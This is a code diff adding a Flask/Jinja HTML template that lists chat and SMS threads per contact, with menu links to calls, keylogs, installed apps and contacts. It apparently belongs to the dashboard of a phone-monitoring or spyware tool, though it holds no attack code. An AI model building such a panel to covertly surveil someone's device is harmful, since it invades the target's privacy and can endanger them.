@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- ... meta, title ... -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='cyf8QhNEWE-MbVu6J6TSgCzupAm9R8u1G.css') }}">
+  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+  <script src="{{ url_for('static', filename='script.js') }}" defer></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Chats</h1>  <!-- Static title -->
+
+    <input type="text" id="search-input" placeholder="Search Messenger" onkeyup="searchMessages()">
+    <div id="search-results"></div>
+
+    <ul id="conversation-list">
+      {% for contact in contacts %}
+        <li>
+            <a href="{{ url_for('chat', contact_name=contact['name']) }}">
+                {{ contact['name'] }}
+                <span class="message-snippet"></span> </a> <br>
+                <a href="{{ url_for('sms_thread', contact_name=contact['name']) }}">
+                {{ contact['name'] }}
+                <span class="message-snippet"></span> </a>
+            <span class="timestamp">{{ contact['time'] }}</span> </li>
+      {% endfor %}
+
+    </ul>
+
+     <a href="/calls" class = "menu-button">Calls</a> <br> <a href="/keylogs" class = "menu-button">Keylogs</a><br>
+     <a href="/installed_apps" class = "menu-button">Installed Apps</a> <br> <a href="/contacts" class = "menu-button">Contacts</a>
+
+
+
+  </div>
+</body>
+</html>
